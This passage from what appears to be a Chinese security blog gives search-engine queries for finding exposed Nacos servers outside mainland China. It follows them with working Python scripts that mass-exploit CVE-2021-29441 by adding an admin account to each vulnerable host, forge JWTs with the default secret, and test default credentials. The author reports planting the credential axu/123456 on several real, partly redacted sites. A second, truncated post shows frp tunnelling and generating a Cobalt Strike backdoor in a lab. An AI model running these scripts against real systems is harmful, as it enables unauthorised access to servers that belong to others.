    <content type="html"><![CDATA[<h1 id="1-Nacos站点收集"><a href="#1-Nacos站点收集" class="headerlink" title="1.Nacos站点收集"></a>1.Nacos站点收集</h1><ol><li><p>根据站点图标搜集</p><p>fofa：<code>(icon_hash=&quot;13942501&quot; &amp;&amp; region=&quot;HK&quot;) || (icon_hash=&quot;13942501&quot; &amp;&amp; country!=&quot;CN&quot;)</code></p><p>hunter：<code>(web.icon==&quot;8f46227059a154868985a6f64a3e602f&quot;&amp;&amp;ip.province==&quot;中国香港&quot;)||(web.icon==&quot;8f46227059a154868985a6f64a3e602f&quot; &amp;&amp; ip.country!=&quot;中国&quot;</code></p></li><li><p>根据站点title收集站点</p><p>fofa：<code>(title=&quot;Nacos&quot; &amp;&amp; region=&quot;HK&quot;) || (title=&quot;Nacos&quot; &amp;&amp; country!=&quot;CN&quot;)</code></p><p>hunter：<code>(web.title=&quot;Nacos&quot; &amp;&amp; ip.province==&quot;中国香港&quot;) ||(web.title=&quot;Nacos&quot; &amp;&amp; ip.country!=&quot;中国&quot;)</code></p></li><li><p>去重后有208个站点</p></li></ol><h1 id="2-Nacos未授权访问漏洞-CVE-2021-29441"><a href="#2-Nacos未授权访问漏洞-CVE-2021-29441" class="headerlink" title="2. Nacos未授权访问漏洞(CVE-2021-29441)"></a>2. Nacos未授权访问漏洞(CVE-2021-29441)</h1><p>​<strong>漏洞描述：</strong>该漏洞发生在nacos在进行认证授权操作时，会判断请求的<code>user-agent</code>是否为<strong>”Nacos-Server”</strong>，如果是的话则不进行任何认证。</p><p>​<strong>影响版本: Nacos &lt;&#x3D; 2.0.0-ALPHA.1</strong></p><p>　　<strong>漏洞编号：CVE-2021-29441</strong></p><p>​参考：<a href="https://www.cnblogs.com/thespace/p/16777691.html">https://www.cnblogs.com/thespace/p/16777691.html</a></p><p>漏洞利用过程如下：</p><ol><li><p>修改User-Agent的值为Nacos-Server到请求包中</p></li><li><p>访问<a href="http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9%E6%9F%A5%E7%9C%8B%E7%8A%B6%E6%80%81%E7%A0%81%E6%98%AF%E5%90%A6%E4%B8%BA200%EF%BC%8C%E4%B8%94%E5%86%85%E5%AE%B9%E4%B8%AD%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%60pageItems%60">http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9查看状态码是否为200，且内容中是否包含`pageItems`</a></p></li><li><p>使用POST方式访问<a href="http://target:8848/nacos/v1/auth/users%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%94%A8%E6%88%B7">http://target:8848/nacos/v1/auth/users添加一个新用户</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /nacos/v1/auth/users HTTP/1.1</span><br><span class="line">Host: ****</span><br><span class="line">accept: */*</span><br><span class="line">User-Agent: Nacos-Server</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">username=***&amp;password=****</span><br></pre></td></tr></table></figure></li><li><p>访问<a href="http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9%E8%8E%B7%E5%8F%96%E5%B7%B2%E6%9C%89%E7%9A%84%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8">http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9获取已有的用户列表</a></p></li><li><p>访问<a href="http://target:8848/nacos/%EF%BC%8C%E4%BD%BF%E7%94%A8%E6%B7%BB%E5%8A%A0%E7%9A%84%E6%96%B0%E7%94%A8%E6%88%B7(vulhub/vulhub)%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95">http://target:8848/nacos/，使用添加的新用户(vulhub/vulhub)进行登录</a></p></li></ol><p>漏洞利用脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import concurrent.futures</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">myheaders = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Nacos-Server&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def add_user(url):</span><br><span class="line">    add_user_endpoint = &quot;/nacos/v1/auth/users?username=***&amp;password=*****&quot;</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url + add_user_endpoint, headers=myheaders, timeout=10, verify=False)</span><br><span class="line">        print(r.text)</span><br><span class="line">        if r.status_code == 200 and &quot;create user ok&quot; in r.text:</span><br><span class="line">            print(&quot;Add User Success&quot;)</span><br><span class="line">            print(&quot;New User Info: ***/*****&quot;)</span><br><span class="line">            print(&quot;Nacos Login Endpoint: &#123;&#125;/nacos/&quot;.format(url))</span><br><span class="line">            print(&quot;====================================&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Add User Failed&quot;)</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        add_user(url)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def Nacos_unauthorized(url):</span><br><span class="line">    try:</span><br><span class="line">        endpoint = &quot;/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&quot;</span><br><span class="line">        </span><br><span class="line">        #检验是否存在Nacos未授权漏洞</span><br><span class="line">        response1 = requests.get(url + endpoint, headers=myheaders, timeout=10, verify=False)</span><br><span class="line">        if response1.status_code == 200 and &quot;pageItems&quot; in response1.text:</span><br><span class="line">            print(url + &quot; has vulnerabilities&quot;)</span><br><span class="line">            #存在漏洞则创建用户</span><br><span class="line">            add_user(url)</span><br><span class="line">        #else:</span><br><span class="line">            #print(url + &quot; has not vulnerabilities&quot;)</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        Nacos_unauthorized(url)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print(&quot;please input url.txt&quot;)</span><br><span class="line">    else:</span><br><span class="line">        file_path = sys.argv[1]</span><br><span class="line">        with open(file_path, &quot;r&quot;) as file:</span><br><span class="line">            # 读取文件的每一行</span><br><span class="line">            lines = file.readlines()</span><br><span class="line">            #for line in lines:</span><br><span class="line">            #    print(line.strip())  </span><br><span class="line">            with concurrent.futures.ThreadPoolExecutor() as executor:</span><br><span class="line">                # 提交任务给线程池</span><br><span class="line">                futures = [executor.submit(Nacos_unauthorized,line.strip()) for line in lines]</span><br></pre></td></tr></table></figure><p>具有nacos未授权的站点如下，统一新增<code>axu/123456</code>的凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://**.254.76.***</span><br><span class="line">http://nacos.*****.net</span><br><span class="line">http://nacos.******.com</span><br><span class="line">https://nacos.*******.com</span><br></pre></td></tr></table></figure><h1 id="3-Nacos登录绕过漏洞-CVE-2021-43116"><a href="#3-Nacos登录绕过漏洞-CVE-2021-43116" class="headerlink" title="3. Nacos登录绕过漏洞(CVE-2021-43116)"></a>3. Nacos登录绕过漏洞(CVE-2021-43116)</h1><p>参考：<a href="https://github.com/alibaba/nacos/issues/7182">https://github.com/alibaba/nacos/issues/7182</a></p><p>利用过程：</p><ol><li><p>目前无法正常登录目标站点</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052007715.png" alt="image-20240705200757621"></p><p>利用burpsuite捕获该登录的数据库包，并选择响应该数据包</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052009890.png" alt="image-20240705200908817"></p></li><li><p>原始的响应包</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052009264.png" alt="image-20240705200952197"></p><p>伪造的响应数据包如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Server: nginx/1.19.6</span><br><span class="line">Date: Sun, 11 Apr 2021 01:48:17 GMT</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Origin</span><br><span class="line">Vary: Access-Control-Request-Method</span><br><span class="line">Vary: Access-Control-Request-Headers</span><br><span class="line">Access-Control-Allow-Origin: http://8.218.178.164:8848/</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用伪造的响应包去响应登录请求，成功绕过了登录</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407052011692.png" alt="image-20240705201104561"></p></li></ol><p>检测存在漏洞的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line">from jwt.algorithms import has_crypto, requires_cryptography</span><br><span class="line">from jwt.utils import base64url_encode, force_bytes</span><br><span class="line">from jwt import PyJWS</span><br><span class="line"></span><br><span class="line">class MyPyJWS(PyJWS):</span><br><span class="line">    def encode(self,</span><br><span class="line">               payload,  # type: Union[Dict, bytes]</span><br><span class="line">               key,  # type: str</span><br><span class="line">               algorithm=&#x27;HS256&#x27;,  # type: str</span><br><span class="line">               headers=None,  # type: Optional[Dict]</span><br><span class="line">               json_encoder=None  # type: Optional[Callable]</span><br><span class="line">               ):</span><br><span class="line">        segments = []</span><br><span class="line"></span><br><span class="line">        if algorithm is None:</span><br><span class="line">            algorithm = &#x27;none&#x27;</span><br><span class="line"></span><br><span class="line">        if algorithm not in self._valid_algs:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">        # Header</span><br><span class="line">        header = &#123;&#x27;alg&#x27;: algorithm&#125;</span><br><span class="line"></span><br><span class="line">        if headers:</span><br><span class="line">            self._validate_headers(headers)</span><br><span class="line">            header.update(headers)</span><br><span class="line"></span><br><span class="line">        json_header = force_bytes(</span><br><span class="line">            json.dumps(</span><br><span class="line">                header,</span><br><span class="line">                separators=(&#x27;,&#x27;, &#x27;:&#x27;),</span><br><span class="line">                cls=json_encoder</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        segments.append(base64url_encode(json_header))</span><br><span class="line">        segments.append(base64url_encode(payload))</span><br><span class="line"></span><br><span class="line">        # Segments</span><br><span class="line">        signing_input = b&#x27;.&#x27;.join(segments)</span><br><span class="line">        try:</span><br><span class="line">            alg_obj = self._algorithms[algorithm]</span><br><span class="line">            key = alg_obj.prepare_key(key)</span><br><span class="line">            signature = alg_obj.sign(signing_input, key)</span><br><span class="line"></span><br><span class="line">        except KeyError:</span><br><span class="line">            if not has_crypto and algorithm in requires_cryptography:</span><br><span class="line">                raise NotImplementedError(</span><br><span class="line">                    &quot;Algorithm &#x27;%s&#x27; could not be found. Do you have cryptography &quot;</span><br><span class="line">                    &quot;installed?&quot; % algorithm</span><br><span class="line">                )</span><br><span class="line">            else:</span><br><span class="line">                raise NotImplementedError(&#x27;Algorithm not supported&#x27;)</span><br><span class="line"></span><br><span class="line">        segments.append(base64url_encode(signature))</span><br><span class="line"></span><br><span class="line">        return b&#x27;.&#x27;.join(segments)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def JwtGenerate():</span><br><span class="line">    Secret = &#x27;SecretKey01234567890123456789012345678901234567890123456789012345678&#x27;</span><br><span class="line">    payload = json.dumps(</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;sub&quot;: &quot;nacos&quot;,</span><br><span class="line">            &quot;exp&quot;: int(time.time()) + 3600</span><br><span class="line">        &#125;,</span><br><span class="line">        separators=(&#x27;,&#x27;, &#x27;:&#x27;)</span><br><span class="line">    ).encode(&#x27;utf-8&#x27;)</span><br><span class="line">    encoded_jwt = MyPyJWS().encode(payload, base64.urlsafe_b64decode(Secret), algorithm=&#x27;HS256&#x27;)</span><br><span class="line">    return encoded_jwt.decode()</span><br><span class="line"></span><br><span class="line">def check(url, https, token):</span><br><span class="line">    if https:</span><br><span class="line">        r = requests.get(</span><br><span class="line">            url=&#x27;https://&#x27; + url + &#x27;/nacos/v1/cs/configs?dataId=&amp;group=&amp;appName=&amp;config_tags=&amp;pageNo=1&amp;pageSize=10&amp;tenant=&amp;search=accurate&amp;accessToken=&#x27; + token + &#x27;&amp;username=&#x27;,</span><br><span class="line">            verify=False)</span><br><span class="line">    else:</span><br><span class="line">        r = requests.get(</span><br><span class="line">            url=&#x27;http://&#x27; + url + &#x27;/nacos/v1/cs/configs?dataId=&amp;group=&amp;appName=&amp;config_tags=&amp;pageNo=1&amp;pageSize=10&amp;tenant=&amp;search=accurate&amp;accessToken=&#x27; + token + &#x27;&amp;username=&#x27;)</span><br><span class="line">    if r.status_code == 403:</span><br><span class="line">        print(&quot;There is no CVE-2021-43116 problem with the url!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;There is CVE-2021-43116 problem with the url!&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&quot;-t&quot;, &quot;--target&quot;, help=&quot;URL of the target. example: 192.168.1.1:8848&quot;)</span><br><span class="line">    parser.add_argument(&quot;-s&quot;, &quot;--https&quot;, help=&quot;Whether https is used. Default is false&quot;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    url = args.target</span><br><span class="line">    https = False</span><br><span class="line">    if (args.https):</span><br><span class="line">        https = args.https</span><br><span class="line">    if url:</span><br><span class="line">        check(url, https, JwtGenerate())</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;Please enter URL!&#x27;)</span><br></pre></td></tr></table></figure><p>比较粗糙的判别方式，可能存在漏洞的站点</p><h1 id="4-Nacos默认口令"><a href="#4-Nacos默认口令" class="headerlink" title="4.Nacos默认口令"></a>4.Nacos默认口令</h1><ol><li><p>使用下列脚本测试使用默认<code>nacos:nacos</code>口令的Nacos站点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import concurrent.futures</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Nacos-Server&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mydata = &#123;</span><br><span class="line">    &#x27;username&#x27;: &#x27;nacos&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;nacos&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_default(url):</span><br><span class="line">    endpoint = &quot;/v1/auth/login&quot;</span><br><span class="line">    r = requests.post(url + endpoint, verify=False, data=mydata, timeout=10)</span><br><span class="line">    try:</span><br><span class="line">        if r.status_code == 200 and &quot;data&quot; in r.text:</span><br><span class="line">            print(url + &quot; has default credentials&quot;)</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        check_default(url)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print(&quot;请输入url.txt&quot;)</span><br><span class="line">    else:</span><br><span class="line">        file_path = sys.argv[1]</span><br><span class="line">        with open(file_path, &quot;r&quot;) as file:</span><br><span class="line">            # 读取文件的每一行</span><br><span class="line">            lines = file.readlines()</span><br><span class="line">            #for line in lines:</span><br><span class="line">            #    print(line.strip())  </span><br><span class="line">            with concurrent.futures.ThreadPoolExecutor() as executor:</span><br><span class="line">                # 提交任务给线程池</span><br><span class="line">                futures = [executor.submit(check_default,line.strip()) for line in lines]</span><br></pre></td></tr></table></figure></li></ol><h1 id="5-没有开启鉴权"><a href="#5-没有开启鉴权" class="headerlink" title="5.没有开启鉴权"></a>5.没有开启鉴权</h1><p>检测脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import concurrent.futures</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">mydata = &#123;</span><br><span class="line">    &#x27;username&#x27;: &#x27;nacos&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;nacos&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(url):</span><br><span class="line">    #endpoint = &quot;/v1/cs/configs?dataId=&amp;group=&amp;appName=&amp;config_tags=&amp;pageNo=1&amp;pageSize=10&amp;tenant=&amp;search=blur&quot;</span><br><span class="line">    endpoint = &quot;/v1/console/server/state?accessToken=&amp;username=&quot;</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url+endpoint , verify=False, timeout=10)</span><br><span class="line">        response_json = r.json()</span><br><span class="line">            </span><br><span class="line">        if &quot;login_page_enabled&quot; in response_json and response_json[&quot;login_page_enabled&quot;] == &quot;false&quot;:</span><br><span class="line">            print(url + &quot; 未开启鉴权&quot;)</span><br><span class="line">            return True</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        check(url)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">        return False</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print(&quot;请输入url.txt&quot;)</span><br><span class="line">    else:</span><br><span class="line">        file_path = sys.argv[1]</span><br><span class="line">        with open(file_path, &quot;r&quot;) as file:</span><br><span class="line">            # 读取文件的每一行</span><br><span class="line">            lines = file.readlines()</span><br><span class="line">            #for line in lines:</span><br><span class="line">            #    print(line.strip())  </span><br><span class="line">            with concurrent.futures.ThreadPoolExecutor() as executor:</span><br><span class="line">                # 提交任务给线程池</span><br><span class="line">                futures = [executor.submit(check,line.strip()) for line in lines]</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-Nacos站点收集&quot;&gt;&lt;a href=&quot;#1-Nacos站点收集&quot; class=&quot;headerlink&quot; title=&quot;1.Nacos站点收集&quot;&gt;&lt;/a&gt;1.Nacos站点收集&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;根据站点图标搜集&lt;/p&gt;
&lt;p&gt;fofa：&lt;cod</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://axusun01.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    <category term="红队" scheme="https://axusun01.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%BA%A2%E9%98%9F/"/>
    
    
    <category term="蓝队" scheme="https://axusun01.github.io/tags/%E8%93%9D%E9%98%9F/"/>
    
    <category term="攻防演练" scheme="https://axusun01.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
    <category term="事件研判" scheme="https://axusun01.github.io/tags/%E4%BA%8B%E4%BB%B6%E7%A0%94%E5%88%A4/"/>
    
    <category term="应急响应" scheme="https://axusun01.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="安全运营" scheme="https://axusun01.github.io/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
  </entry>
  
  <entry>
    <title>Frp内网渗透</title>
    <link href="https://axusun01.github.io/2024/07/05/d9d69100/"/>
    <id>https://axusun01.github.io/2024/07/05/d9d69100/</id>
    <published>2024-07-05T02:00:52.000Z</published>
    <updated>2024-07-05T12:16:42.197Z</updated>
    
    <content type="html"><![CDATA[<div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 2.68K </p>    </div>    <div class="cell" style="">    <p>代码: 0.30K, 文本: 0.97K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 5 分钟</p>    </div>    </div><p>内网穿透（Port Forwarding）是将公网上的IP地址映射到内部网络中的一台计算机的某个端口上，以便外部网络可以访问该计算机中运行的应用程序。</p><p>本次测试frp所使用的工具<br>Frpc</p><p>frp的原理如下：<br>1.客户端向frp服务器发送请求。当客户端启动时，它会向frp服务器发送一条请求，请求服务器分配一个唯一的客户端ID。<br>2.服务器返回分配的客户端ID。frp服务器将分配一个唯一的客户端ID，并将其返回给客户端。<br>3.客户端连接到服务器。客户端使用分配的客户端ID连接到frp服务器，以便服务器可以知道客户端要连接的计算机和端口。<br>4.服务器将请求转发到客户端。当外部网络发出请求时，frp服务器将请求转发到客户端，客户端将请求转发到指定的计算机和端口上。</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051933510.png" alt="image-20240704172213348"></p><p>本机cs连接测试内网穿透<br>服务端：kali    192.168.52.128    密码123456<br>客户端：win10    192.168.52.132</p><p>kali操作：<br>cd &#x2F;home&#x2F;axu&#x2F;cs4.4<br>.&#x2F;teamserver 192.168.52.128 123456注意这个端口，启动cs的时候需要</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051934407.png" alt="image-20240704172230244"></p><p>.&#x2F;cobaltstrike</p><p><img src="E:\BlogFile\source_posts\Frp内网穿透.assets\image-20240704172236184.png" alt="image-20240704172236184"></p><p>ip即kali服务器ip</p><p><img src="E:\BlogFile\source_posts\Frp内网穿透.assets\image-20240704172241853.png" alt="image-20240704172241853"></p><p>进入到cs界面</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935256.png" alt="image-20240704172249424"></p><p>添加一个监听，HTTP Host为kali服务器ip，端口6666，payload这里选择HTTP</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935368.png" alt="image-20240704172255342"></p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935787.png" alt="image-20240704172304982"></p><p>选择生成后门-</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051935150.png" alt="image-20240704172316298"></p><p>选择创建的监听器，生成下载到kali机器 cd &#x2F;root&#x2F;xu.exe</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936316.png" alt="image-20240704172321675"></p><p>因为是本机测试，将xu.exe直接copy到win10目标机，双击运行<br>可看到已经成功获得对方的shell，目标机器已上线</p><p><img src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407051936368.png" alt="image-20240704172329497"></p><p>提权</p><p><img 